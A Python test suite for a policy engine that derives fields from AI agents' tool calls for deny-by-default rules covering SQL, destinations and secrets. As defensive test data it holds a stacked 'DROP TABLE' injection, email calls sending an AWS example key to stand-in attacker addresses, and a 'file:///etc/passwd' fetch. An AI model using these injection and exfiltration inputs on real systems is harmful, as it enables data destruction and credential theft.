# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""`input.derived` — the primitives a USER-AUTHORED policy needs and otherwise cannot reach.

The bundled presets carry their own walk/normalize/alias-match logic. A hand-written policy has no way
to call it: the engine evaluates every policy as a single self-contained module, and this OPA cannot
import across packages (the same constraint that forces comprehensive.rego and _shared/horizontal.rego
to be two copies guarded by a parity test). Shipping the primitives as INPUT sidesteps that.

Why it matters, concretely: the obvious "only these SQL statements may run" policy — written the way
the console template leads you to write it — has three bypasses and three false-positives. The
bypasses let unapproved SQL through; the false-positives block legitimate traffic, which is what gets
a policy switched off in week one. `tests/policies/test_sql_allowlist_template.py` proves the
deny-by-default template built on these fields closes all six.
"""

from __future__ import annotations

from types import SimpleNamespace

from norviq.engine.evaluator import OPAEvaluator


def _derived(tool: str, params: dict) -> dict:
    ev = OPAEvaluator.__new__(OPAEvaluator)  # only the pure helpers are exercised
    return ev._derived_input(SimpleNamespace(tool_name=tool, tool_params=params))


# --- param_values: defeats param-name renaming ------------------------------------------------------


def test_param_values_flattens_arbitrary_nesting() -> None:
    """A rule keyed on `tool_params.query` misses `tool_params.sql` — and misses a nested payload
    entirely. Every leaf string must be reachable regardless of the key that held it."""
    d = _derived("execute_sql", {"a": "one", "b": {"c": "two", "d": [{"e": "three"}]}})
    assert set(d["param_values"]) == {"one", "two", "three"}


def test_param_values_lower_is_provided_for_case_insensitive_matching() -> None:
    d = _derived("x", {"k": "MiXeD"})
    assert d["param_values_lower"] == ["mixed"]


def test_non_string_leaves_are_dropped_not_stringified() -> None:
    """Numbers/bools must not become matchable text — `1` should never satisfy a substring rule."""
    d = _derived("x", {"n": 42, "b": True, "s": "real"})
    assert d["param_values"] == ["real"]


# --- tool_kind: defeats tool renaming ---------------------------------------------------------------


def test_renamed_sql_tool_is_still_classified_sql() -> None:
    """The bypass: a rule keyed on `tool_name == "execute_sql"` misses a renamed `run_report`."""
    for name in ("execute_sql", "run_query", "db_query", "run_report", "sales_report", "SQL"):
        assert _derived(name, {})["tool_kind"] == "sql", name


def test_unrelated_tool_is_not_classified_sql() -> None:
    for name in ("search_kb", "send_email", "delete_record"):
        assert _derived(name, {})["tool_kind"] == "other", name


# --- sql_normalized / sql_statements: defeats formatting --------------------------------------------


def test_formatting_differences_normalize_to_one_form() -> None:
    """The false-positives that get an allowlist switched off: case, padding, trailing semicolon,
    and collapsed internal whitespace must all reach the same string."""
    forms = [
        "SELECT * FROM orders",
        "select * from orders",
        "  SELECT   *   FROM   orders  ",
        "SELECT * FROM orders;",
        "select * from orders ;",
    ]
    assert {_derived("execute_sql", {"query": f})["sql_normalized"] for f in forms} == {
        "select * from orders"
    }


def test_sql_is_found_regardless_of_param_name() -> None:
    """The statement is located by its SHAPE, not by the key it arrived under."""
    for key in ("query", "sql", "statement", "q", "anything"):
        assert _derived("execute_sql", {key: "SELECT 1"})["sql_normalized"] == "select 1"


def test_stacked_statements_are_split_so_an_allowlist_sees_all_of_them() -> None:
    """`SELECT ...; DROP TABLE users` must not pass by having an approved FIRST statement."""
    d = _derived("execute_sql", {"query": "SELECT * FROM orders; DROP TABLE users"})
    assert d["sql_statements"] == ["select * from orders", "drop table users"]


def test_no_sql_yields_empty_not_missing() -> None:
    """Absent SQL must be an empty string/list, never a missing key — a missing key makes a Rego rule
    body undefined, which silently falls through to the policy default."""
    d = _derived("search_kb", {"q": "refund window"})
    assert d["sql_normalized"] == ""
    assert d["sql_statements"] == []


def test_empty_params_are_safe() -> None:
    """`execute_sql` with no params at all — the shape that made the naive allowlist fail open."""
    d = _derived("execute_sql", {})
    assert d["param_values"] == []
    assert d["sql_statements"] == []
    assert d["tool_kind"] == "sql"  # still a SQL tool, so a deny-by-default rule still governs it


# --- contract stability ------------------------------------------------------------------------------


def test_derived_keys_are_stable() -> None:
    """User policies bind to these names; dropping or renaming one silently breaks every policy that
    reads it (a missing key makes the rule body undefined rather than raising)."""
    assert set(_derived("execute_sql", {"query": "SELECT 1"})) == {
        "verb",
        "param_values",
        "param_values_lower",
        "tool_kind",
        "sql_normalized",
        "sql_statements",
        # scoping primitives (intent policies) — additive; the six above are unchanged
        "param_paths",
        "destinations",
        "data_classes",
        "sql_tables",
        "param_bytes",
    }


def test_risk_is_deliberately_not_exposed() -> None:
    """Verb is a FACT about the call; risk is a JUDGEMENT that shifts as the registry is updated. A
    policy pinned to risk could change behaviour on an upgrade without the policy changing, so risk
    stays a console-only signal and out of the enforcement input."""
    assert "risk" not in _derived("milvus_delete", {})


def test_verb_classifies_by_operation_across_vendors() -> None:
    """The point of verb gating: express "reads only" without enumerating every vendor's tool names."""
    for tool, expected in (
        ("milvus_search", "read"),
        ("milvus_query", "read"),
        ("milvus_insert", "write"),
        ("milvus_delete", "delete"),
        ("milvus_drop_collection", "delete"),
        ("send_email", "send"),
    ):
        assert _derived(tool, {})["verb"] == expected, tool


def test_unclassified_tool_is_unknown_not_guessed_safe() -> None:
    """An unrecognised name must surface as `unknown` — a first-class value a policy can match on —
    rather than being guessed into a benign verb. Guessing safe is how a novel name gets through."""
    assert _derived("some_unknown_vendor_tool", {})["verb"] == "unknown"


# =====================================================================================================
# Scoping primitives for positive-security (intent) policies.
#
# `param_values` answers "is a secret ANYWHERE in this call" — the right question for a detector and
# the wrong one for a scope. An intent has to say "the RECIPIENT must be @acme.com", and against a
# flat value list the recipient and the message body are indistinguishable. These fields exist so a
# deny-by-default rule can name one argument, one destination, or one data class.
# =====================================================================================================


# --- param_paths: restores the key a value was held under -------------------------------------------


def test_param_paths_distinguishes_recipient_from_body() -> None:
    """The whole reason this field exists. Against `param_values` alone, a rule meaning "only mail
    acme.com" matches just as happily when the acme address appears in the BODY of a message being
    sent somewhere else entirely."""
    d = _derived("send_email", {"to": "attacker@evil.example", "body": "contact us at a@acme.com"})
    assert d["param_paths"]["to"] == "attacker@evil.example"
    assert d["param_paths"]["body"] == "contact us at a@acme.com"
    # both addresses are present in the flat view, which is exactly why the flat view cannot decide
    assert "a@acme.com" in " ".join(d["param_values"])


def test_param_paths_uses_dots_for_objects_and_brackets_for_lists() -> None:
    d = _derived("q", {"filters": {"customer": {"ids": ["C-91", "C-92"]}}})
    assert d["param_paths"] == {
        "filters.customer.ids[0]": "C-91",
        "filters.customer.ids[1]": "C-92",
    }


def test_param_paths_drops_non_strings_like_param_values_does() -> None:
    """Matching the string "1" against an integer 1 would be matching a coincidence of formatting."""
    d = _derived("q", {"n": 1, "flag": True, "nothing": None, "s": "yes"})
    assert d["param_paths"] == {"s": "yes"}


def test_param_paths_is_empty_not_missing_for_empty_params() -> None:
    """A missing key makes a Rego rule body undefined rather than raising, so absence must not be a
    way to slip past a rule that reads this field."""
    assert _derived("q", {})["param_paths"] == {}


# --- param_paths bounds: the input document is built on every evaluation -----------------------------


def test_param_paths_is_depth_bounded() -> None:
    """A deeply nested params object must not be able to grow the input document without limit."""
    node: dict = {"leaf": "deep"}
    for _ in range(60):
        node = {"n": node}
    paths = _derived("q", node)["param_paths"]
    assert all(p.count(".") <= OPAEvaluator._MAX_PATH_DEPTH for p in paths)


def test_param_paths_is_count_bounded() -> None:
    d = _derived("q", {f"k{i}": f"v{i}" for i in range(OPAEvaluator._MAX_PATHS * 3)})
    assert len(d["param_paths"]) <= OPAEvaluator._MAX_PATHS


def test_param_paths_values_are_length_bounded() -> None:
    d = _derived("q", {"big": "x" * (OPAEvaluator._MAX_PATH_VALUE_LEN * 2)})
    assert len(d["param_paths"]["big"]) == OPAEvaluator._MAX_PATH_VALUE_LEN


# --- destinations: under deny-by-default the destination IS the control ------------------------------


def test_destinations_extracts_emails_urls_hosts_and_schemes() -> None:
    d = _derived("send_email", {"to": "a@acme.com", "cb": "https://api.acme.com/v1/hook"})
    assert d["destinations"]["emails"] == ["a@acme.com"]
    assert d["destinations"]["hosts"] == ["api.acme.com"]
    assert d["destinations"]["schemes"] == ["https"]


def test_destinations_are_sorted_and_deduplicated_for_set_operations() -> None:
    """An intent says `subsetOf: [https]`; that must not depend on ordering or repetition."""
    d = _derived("x", {"a": "https://b.example/1", "b": "https://a.example/2", "c": "https://b.example/3"})
    assert d["destinations"]["hosts"] == ["a.example", "b.example"]
    assert d["destinations"]["schemes"] == ["https"]


def test_destinations_surface_a_non_https_scheme_rather_than_normalising_it() -> None:
    """`file://` and `http://` are the interesting ones; a policy can only refuse what it can see."""
    d = _derived("fetch", {"u": "file:///etc/passwd"})
    assert "file" in d["destinations"]["schemes"]


def test_destinations_are_empty_not_missing_when_the_call_has_none() -> None:
    d = _derived("q", {"query": "SELECT 1"})
    assert d["destinations"] == {"emails": [], "urls": [], "hosts": [], "schemes": []}


# --- data_classes: classifies the REQUEST, which nothing did before ----------------------------------


def test_data_classes_detects_a_real_aws_key_in_free_text() -> None:
    """The §11.5 case, recorded on a live cluster: the strict preset blocked a card number and let an
    AWS key pair through to an attacker-controlled address, because the credential detector keyed on
    parameter NAMES and this key sat in a free-text body."""
    d = _derived("send_email", {"to": "collector@attacker.example",
                                "body": "AKIAIOSFODNN7EXAMPLE wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"})
    assert "secret" in d["data_classes"]


def test_data_classes_detects_secret_by_key_name_when_the_value_looks_innocuous() -> None:
    """`{"password": "hunter2"}` has no credential SHAPE at all — the key name is the only signal."""
    assert "secret" in _derived("login", {"password": "hunter2"})["data_classes"]


def test_data_classes_detects_pci_and_pii_by_value() -> None:
    d = _derived("x", {"a": "card 4111 1111 1111 1111", "b": "ssn 123-45-6789"})
    assert d["data_classes"] == ["pci", "pii"]


def test_data_classes_is_empty_for_an_ordinary_call() -> None:
    """It must not fire on everything, or an intent gating on it denies all legitimate work."""
    assert _derived("search_docs", {"query": "quarterly revenue"})["data_classes"] == []


def test_data_classes_is_sorted_so_a_policy_can_compare_sets() -> None:
    d = _derived("x", {"tok": "ghp_aaaaaaaaaaaaaaaaaaaa", "c": "4111111111111111"})
    assert d["data_classes"] == sorted(d["data_classes"])


# --- sql_tables: scope by table instead of pinning an exact statement --------------------------------


def test_sql_tables_finds_from_and_join_targets() -> None:
    d = _derived("execute_sql", {"q": "SELECT a FROM orders JOIN customers ON x"})
    assert d["sql_tables"] == ["orders", "customers"]


def test_sql_tables_strips_the_schema_qualifier() -> None:
    """`subsetOf: [orders]` should not fail because the caller wrote public.orders."""
    assert _derived("execute_sql", {"q": "SELECT 1 FROM public.orders"})["sql_tables"] == ["orders"]


def test_sql_tables_covers_write_and_destructive_forms() -> None:
    assert _derived("execute_sql", {"q": "INSERT INTO audit VALUES (1)"})["sql_tables"] == ["audit"]
    assert _derived("execute_sql", {"q": "UPDATE orders SET x=1"})["sql_tables"] == ["orders"]


def test_sql_tables_is_empty_for_a_non_sql_call() -> None:
    assert _derived("send_email", {"to": "a@acme.com"})["sql_tables"] == []


# --- param_bytes -------------------------------------------------------------------------------------


def test_param_bytes_counts_utf8_length_of_the_string_payload() -> None:
    assert _derived("x", {"a": "abc", "b": "de"})["param_bytes"] == 5
    assert _derived("x", {"a": "é"})["param_bytes"] == 2  # 2 bytes in utf-8, not 1 char


# --- additivity: every existing policy must see an unchanged document --------------------------------


def test_existing_fields_are_byte_identical_after_the_extension() -> None:
    """The extension is additive by contract. Any change to these six silently alters the behaviour of
    every policy already deployed against them."""
    d = _derived("execute_sql", {"query": "SELECT * FROM orders;", "note": "MiXeD"})
    # PRE-EXISTING, asserted as-is so this test measures additivity rather than re-litigating it:
    # `execute_sql` classifies as delete/critical because `classify_tool` tokenises the name and
    # returns the WORST match. This is product finding #1 (documented for `run_query`) and it is
    # wider than recorded — a plain `SELECT` reads as destructive. Under deny-by-default that is the
    # safe direction (it locks work out loudly); under a `verb == "delete"` block rule it is a
    # false positive on the one tool the class exists to use.
    assert d["verb"] == "delete"
    assert set(d["param_values"]) == {"SELECT * FROM orders;", "MiXeD"}
    assert set(d["param_values_lower"]) == {"select * from orders;", "mixed"}
    assert d["tool_kind"] == "sql"
    assert d["sql_normalized"] == "select * from orders"
    assert d["sql_statements"] == ["select * from orders"]
